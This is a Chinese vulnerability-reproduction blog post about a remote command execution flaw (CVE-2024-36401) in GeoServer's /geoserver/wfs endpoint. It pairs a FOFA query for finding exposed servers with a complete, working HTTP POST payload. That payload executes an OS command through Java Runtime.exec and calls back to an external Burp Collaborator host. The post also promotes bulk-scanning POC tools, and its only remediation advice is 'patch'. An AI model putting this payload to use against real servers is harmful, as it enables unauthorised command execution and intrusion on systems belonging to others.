#  GeoServer /geoserver/wfs接口存在远程命令执行漏洞 附POC   
南风漏洞复现文库  南风漏洞复现文库   2024-07-09 23:32  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. GeoServer /geoserver/wfs接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
GeoServer 是一个开源的地理空间服务器  
## 2.漏洞描述  
  
GeoServer是OGC Web服务器规范的J2EE实现，利用GeoServer可以方便地发布地图数据，允许用户对要素数据进行更新、删除、插入操作，通过GeoServer可以比较容易地在用户之间迅速共享空间地理信息。GeoServer /geoserver/wfs接口存在远程命令执行漏洞  
  
CVE编号:CVE-2024-36401  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
GeoServer  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHWpfNOJ5TtanoaTvXsYsqJc5KpaSRgfiaZ9ZVWPqVIlpsvM513M5mUCIJc91nXrMyicXBo3lduEibg/640?wx_fmt=jpeg&from=appmsg "null")  
  
GeoServer /geoserver/wfs接口存在远程命令执行漏洞  
## 4.fofa查询语句  
  
app="GeoServer"  
## 5.漏洞复现  
  
漏洞链接：http://xxx.xxx.xx.xx/geoserver/wfs  
  
漏洞数据包：  
```
POST /geoserver/wfs HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent:Mozilla/5.0(X11;Linux x86_64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/87.0.4280.88Safari/537.36
Accept-Encoding: gzip, deflate
Accept:*/*
Connection: close
Content-Length: 362

<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'
valueReference='exec(java.lang.Runtime.getRuntime(),"ping 876268.okcfke24wzvpm2c1uyqdbfa3iuokc9.burpcollaborator.net")'>
<wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHWpfNOJ5TtanoaTvXsYsqticXRkx6b4T2icQ81aiaqgaPbxsgu02hu6wOp7SIC5cFucW0qc2yoUOJA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHWpfNOJ5TtanoaTvXsYsqnJU1UGfkD8oVpeGPNN6oI2fzXIyMHZzFONZiaqib2X06FMGnIf7ow6YQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHWpfNOJ5TtanoaTvXsYsqPIuH3Ofcb99J86CGMz3ibgHVgiccOmR0fJh2ZB3tibURtA85zn6icOoXsw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHWpfNOJ5TtanoaTvXsYsqMAndeg0BOGSbtdTU5iaeWdricyFDx4Johibh9dpU0urbd0biazyL2BXJicQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHWpfNOJ5TtanoaTvXsYsq6EpQhx304AErV3j3e9Ucpic8O05AXia1LgCVxDg6v79dCgL1TibPAHQ0Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHWpfNOJ5TtanoaTvXsYsqOsLNYkc0XDbfk8kicJqlgMcgBc23xsWibjLZlXOVdVOWgUeeNfKeicMFw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
[用友U8-Cloud smartweb2.showRPCLoadingTip.d接口存在XXE 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486692&idx=1&sn=486b4add44d42aff4f12c423a7183fa5&chksm=974b81e3a03c08f5ea8fc5bf684f33e16112197b237c274a4c3fe652e00b8c6b520f83a3cd26&scene=21#wechat_redirect)  
  
  
